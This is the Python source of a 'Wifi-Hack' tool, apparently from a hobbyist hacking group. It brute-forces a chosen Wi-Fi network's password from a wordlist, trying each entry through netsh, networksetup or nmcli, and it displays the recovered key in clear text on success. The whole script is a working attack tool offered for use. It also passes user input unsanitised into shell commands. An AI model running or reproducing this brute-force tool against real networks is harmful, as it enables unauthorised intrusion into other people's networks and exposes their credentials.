import os
import urllib.request
import socket
import platform
import time as t
import subprocess
import sys

try:
    import colorama
except ModuleNotFoundError:
    os.system("pip install colorama")
    t.sleep(3)
    print("Run program again")
    if platform.system() == "Windows":
        os.system("pause")
    else:
        input("Press Enter to continue...")
    exit()

from colorama import *
colorama.init(autoreset=True)

# Get the current operating system
CURRENT_OS = platform.system()

# Check if required tools are available
def check_requirements():
    if CURRENT_OS == "Darwin":  # macOS
        # Check for networksetup and airport
        try:
            subprocess.run(["networksetup", "-version"], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(Fore.RED + "[!] networksetup not found. This tool requires macOS network utilities.")
            return False
        # Check if airport utility exists
        airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        if not os.path.exists(airport_path):
            print(Fore.YELLOW + "[!] Airport utility not found. Some features may be limited.")
    elif CURRENT_OS == "Linux":
        # Check for nmcli (NetworkManager)
        try:
            subprocess.run(["nmcli", "--version"], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(Fore.RED + "[!] nmcli (NetworkManager) not found. Please install NetworkManager.")
            return False
    elif CURRENT_OS == "Windows":
        # Windows netsh should be available by default
        pass
    else:
        print(Fore.RED + f"[!] Unsupported operating system: {CURRENT_OS}")
        return False
    return True

if not check_requirements():
    t.sleep(3)
    exit()

#pwdfile = open("config.txt", "r")

#pwd = input(Fore.YELLOW + "Enter activation code: ")

#if pwd != pwdfile.read():

#	print(Fore.RED + "Incorrect Activation code☹️
#t.sleep(3)
# Cross-platform functions
def clear_screen():
    if CURRENT_OS == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def pause_system():
    if CURRENT_OS == "Windows":
        os.system("pause")
    else:
        input("Press Enter to continue...")

def open_url(url):
    if CURRENT_OS == "Windows":
        os.system(f"start {url}")
    elif CURRENT_OS == "Darwin":
        os.system(f"open {url}")
    else:  # Linux
        os.system(f"xdg-open {url}")

def show_available_networks():
    if CURRENT_OS == "Windows":
        os.system("netsh wlan show networks interface=Wi-Fi")
    elif CURRENT_OS == "Darwin":
        # macOS
        airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        if os.path.exists(airport_path):
            os.system(f"{airport_path} -s")
        else:
            os.system("networksetup -listallhardwareports | grep -A 2 Wi-Fi")
    else:  # Linux
        os.system("nmcli dev wifi list")

def connect_to_wifi(ssid, password):
    if CURRENT_OS == "Windows":
        # Windows implementation (existing XML-based approach)
        config_content = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password.strip()}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        
        with open("config.xml", "w") as f:
            f.write(config_content)
        
        os.system('netsh wlan add profile filename="config.xml" interface=Wi-Fi')
        os.system(f'netsh wlan connect name="{ssid}" ssid="{ssid}" interface=Wi-Fi')
        
    elif CURRENT_OS == "Darwin":
        # macOS implementation
        os.system(f'networksetup -setairportnetwork en0 "{ssid}" "{password.strip()}"')
        
    else:  # Linux
        # Linux implementation using nmcli
        os.system(f'nmcli dev wifi connect "{ssid}" password "{password.strip()}"')

def show_wifi_info(ssid):
    if CURRENT_OS == "Windows":
        os.system(f'netsh wlan show profile name="{ssid}" key=clear')
    elif CURRENT_OS == "Darwin":
        os.system(f'networksetup -getairportnetwork en0')
        os.system('ifconfig en0')
    else:  # Linux
        os.system('nmcli connection show --active')
        os.system('iwconfig')

def loop():
    clear_screen()
    def check_connection():
    	try:
    		urllib.request.urlopen('http://google.com')
    		return True
    	except:
    		return False
    if check_connection():
    	print(Fore.RED + "Kindly turn off your mobile data and turn on ur Wifi!")
    	t.sleep(3)
    	loop()
    header = """
    
 ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄ 
▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌        ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀         ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌ 
▐░▌       ▐░▌     ▐░▌     ▐░▌               ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
▐░▌   ▄   ▐░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄      ▐░▌ ▄▄▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌░▌   
▐░▌  ▐░▌  ▐░▌     ▐░▌     ▐░░░░░░░░░░░▌     ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░▌    
▐░▌ ▐░▌░▌ ▐░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀      ▐░▌ ▀▀▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌░▌   
▐░▌▐░▌ ▐░▌▐░▌     ▐░▌     ▐░▌               ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
▐░▌░▌   ▐░▐░▌ ▄▄▄▄█░█▄▄▄▄ ▐░▌           ▄▄▄▄█░█▄▄▄▄         ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌ 
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌        ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
 ▀▀       ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀          ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀ 
                                                                                                           
         
	"""
    print(Fore.RED + header)
    print(Fore.YELLOW + "version 1.1".center(60))
    print(Fore.GREEN + """
Developer: Spider Anongreyhat
Team: TermuxHackz Society
""")
    print(Fore.MAGENTA + "=+"*  100)
    print(Fore.YELLOW + """
[1] Hack Wifi
[2] Display available network
[3] Check Version
[4] Report Issue
""")
    option = input(Fore.GREEN + "ENTER A VALID OPTION : ")
    if option == "1":
        SSID = input(Fore.GREEN + "Input SSID: ")
        filename = input(Fore.GREEN + "Enter wordlist file path: ")
        try:
            wordlist = open(filename, "r")
        except:
            print(Fore.RED + "Invalid file path or file doesn't exist")
            exit()
        
        print(Fore.YELLOW + f"Starting brute force attack on {SSID}...")
        print(Fore.CYAN + f"Platform: {CURRENT_OS}")
        
        for password in wordlist:
            password = password.strip()
            if not password:  # Skip empty lines
                continue
                
            print(Fore.YELLOW + f"Trying password: {password}")
            
            # Use cross-platform WiFi connection function
            connect_to_wifi(SSID, password)
            
            print(Fore.MAGENTA + f"{SSID} connection attempted")
            print(Fore.GREEN + f"Connecting to {SSID}")
            
            t.sleep(3)  # Wait for connection attempt
            
            def connect():
                try:
                    urllib.request.urlopen('http://google.com', timeout=5)
                    return True
                except:
                    return False
            
            if connect():
                clear_screen()
                print(Fore.MAGENTA + f"Connected to {SSID}")
                print(Fore.GREEN + "WIFI HACKED!\n\nDisplaying Wifi Info")
                show_wifi_info(SSID)
                pause_system()
                exit()
            else:
                print(Fore.RED + 'Incorrect password')
        
        print(Fore.RED + "All passwords failed. Attack unsuccessful.")
        wordlist.close()
    elif option == "2":
        print(Fore.MAGENTA + "Displaying available wifi")
        t.sleep(2)
        show_available_networks()
        pause_system()
        loop()
    elif option == "3":
        print(Fore.CYAN + "Version is " + Fore.YELLOW + "v1.1")
        print(Fore.GREEN + f"Platform: {CURRENT_OS}")
        pause_system()
        loop()
    elif option == "4":
        open_url("https://github.com/spider863644/Wifi-Hack/issues")
        exit()
    else:
        print(Fore.RED + "Invalid option ")
        t.sleep(3)
        loop()
    	
    	
loop()  		